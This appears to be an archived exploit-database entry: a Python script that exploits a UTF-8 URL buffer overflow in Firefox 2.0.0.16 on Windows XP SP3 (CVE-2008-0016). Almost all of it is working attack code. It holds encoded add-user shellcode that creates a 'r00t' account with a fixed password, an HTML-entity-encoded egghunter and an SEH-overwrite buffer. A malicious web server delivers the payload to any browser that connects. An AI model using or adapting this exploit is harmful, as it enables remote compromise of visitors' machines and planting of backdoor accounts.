<html><head><title>Mozilla Firefox 2.0.0.16 UTF-8 URL Remote Buffer Overflow Exploit</title></head><pre>#!/usr/bin/python
# FireFox 2.0.0.16 Windows XP SP3 x86 Remote Exploit
# Author: Dominic Chell &lt;dmc@deadbeef.co.uk&gt;
#
# Exploits the UTF-8 URL overflow vulnerability described in CVE-2008-0016.
# As of September 2009 there are no public exploits for this vulnerability.
# However, according to securityfocus an exploit is available in both Canvas
# and Core Impact.
#
# Thanks to meta and ChrisA

from BaseHTTPServer import HTTPServer 
from BaseHTTPServer import BaseHTTPRequestHandler 
import sys 

# Adduser shellcode encoded with shikata_ga_nai
# USER=r00t PASS=r00tr00t!!
egg = (
	&quot;\xda\xd4\x29\xc9\xb8\xb3\xfe\x8b\x54\xd9\x74\x24\xf4\xb1\x32&quot;
	&quot;\x5f\x83\xef\xfc\x31\x47\x14\x03\x47\xa7\x1c\x7e\xa8\x2f\xa4&quot;
	&quot;\x81\x51\xaf\xae\xc7\x6d\x24\xcc\xc2\xf5\x3b\xc2\x46\x4a\x23&quot;
	&quot;\x97\x06\x75\x52\x4c\xf1\xfe\x60\x19\x03\xef\xb9\xdd\x9d\x43&quot;
	&quot;\x3d\x1d\xe9\x9c\xfc\x54\x1f\xa2\x3c\x83\xd4\x9f\x94\x70\x11&quot;
	&quot;\x95\xf1\xf2\x46\x71\xf8\xef\x1f\xf2\xf6\xa4\x54\x5b\x1a\x3a&quot;
	&quot;\x80\xef\x3e\xb7\x57\x1b\xb7\x9b\x73\xdf\x04\x7c\x4d\x29\xea&quot;
	&quot;\xd5\xc9\x5e\xac\xe9\x9a\x21\x3c\x81\xed\xbd\x91\x1e\x65\xb6&quot;
	&quot;\x60\xd8\xf5\x06\x18\x49\x92\x76\x56\x6d\x3d\x1f\xfe\x90\x4b&quot;
	&quot;\xd1\xa9\x93\xab\x8d\x38\x08\x1a\x37\xba\xb5\x42\x98\x59\x16&quot;
	&quot;\xed\x83\xe9\x76\x84\x38\x74\x05\x46\xcd\x46\xd9\xf2\x11\xd4&quot;
	&quot;\x29\xcb\x25\x6a\x7a\x1b\xb2\xab\x5b\x7b\x15\xea\xdf\x3f\x49&quot;
	&quot;\xca\xf9\x9f\xe7\x77\x72\xc0\x9b\x18\x19\x61\x08\x81\xaf\x0e&quot;
	&quot;\xa5\x3d\x70\x90\x21\xd0\x19\x7c\xc3\x59\xae\xf2\x72\xe9\x21&quot;
	&quot;\x81\x07\x31\xcc\x55\xd8\x45\x10\xb9\x59\xe1\x14\xc5\x53&quot;)

# Egghunter where egg is 0x41424142.
# The egghunter is encoded as HTML entities, this evades the unicode conversion.
# Egghunter courtesy of skape. Modified to xor edx,edx as first instruction.
shellcode = (
	&quot;&amp;#xD233;&amp;#x9090;&amp;#x9090;&amp;#x4290;&amp;#x6a52;&amp;#x5802;&amp;#x2ecd;&quot;
	&quot;&amp;#x053c;&amp;#x745a;&amp;#xb8ef;&amp;#x4142;&amp;#x4142;&amp;#xfa8b;&amp;#x75af;&quot;
	&quot;&amp;#xafea;&amp;#xe775;&amp;#xe7ff;&amp;#xcccc;&amp;#xcccc;&amp;#xcccc;&amp;#xcccc;&quot;
	&quot;&amp;#xcccc;&amp;#xcccc;&amp;#xcccc;&amp;#xcccc;&quot;)

# The UTF-8 character in the URL triggers the code path where the overflow occurs.
s = &quot;\xC3\xBA&quot;
u = unicode(s, &quot;utf-8&quot;)
utf8chars = u.encode( &quot;utf-8&quot; )

class myRequestHandler(BaseHTTPRequestHandler):

	def create_exploit_buffer(self):
		html = &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html;charset=utf-8\&quot; /&gt;\n&lt;html&gt;\n&lt;body&gt;\n&quot;

		# Store the egg and adduser shellcode in CDATA
		# The egghunter will try and find this in memory
		html += &quot;&lt;!CDATA[&quot; + &quot;\x42\x41\x42\x41\x42\x41\x42\x41&quot; + egg
		html += &quot;]&gt;\n&quot;

		html += &quot;&lt;a href=\&quot;&quot;
		html += &quot;\x01&quot;
		html += &quot;xx://dmc&quot;
		html += utf8chars
		html += &quot;/&quot;
		
		html += &quot;&amp;#x9090;&quot; * 1700	# Windows XP SP3 SEH offset
		html += &quot;&amp;#4331;&amp;#37008;&quot;	# unicode - ptr to next seh &quot;\xeb\x10\x90\x90&quot;;
		html += &quot;&amp;#x11e7;&amp;#x6037;&quot;	# 0x603711e7 - pop/pop/ret - xpcom_core.dll
		html +=&quot;&amp;#x9090;&quot; * 10
		html += shellcode # add egghunter
		html +=&quot;&amp;#x9090;&quot; * 10
		html += &quot;\&quot; &gt;s&lt;/a&gt;&quot;
		html += &quot;\n&lt;/body&gt;&quot;
		html += &quot;\n&lt;/html&gt;&quot;
	
		return html

	def do_GET(self):
		self.printCustomHTTPResponse(200)
		if self.path == &quot;/&quot;:
			target=self.client_address[0]
			html = self.create_exploit_buffer()
			self.wfile.write(html)
			print &quot;[*] Evil payload sent\n[*] Wait a few minutes and try connecting with r00t/r00tr00t!!\n&quot;
			
	def printCustomHTTPResponse(self, respcode):
		self.send_response(respcode)
		self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;)
		self.send_header(&quot;Server&quot;, &quot;myRequestHandler&quot;)
		self.end_headers()

print &quot;FireFox 2.0.0.16 x86 Exploit\nAuthor: dmc@deadbeef.co.uk\n&quot;
print &quot;[*] Starting evil web server&quot;
print &quot;[*] Waiting for clients\n&quot;

httpd = HTTPServer(('', 80), myRequestHandler)

try:
	httpd.handle_request()
	httpd.serve_forever() 
except KeyboardInterrupt:
	print &quot;\n\n[*] Interupt caught, exiting.\n\n&quot;
	sys.exit(1)

# milw0rm.com [2009-09-14]</pre></html>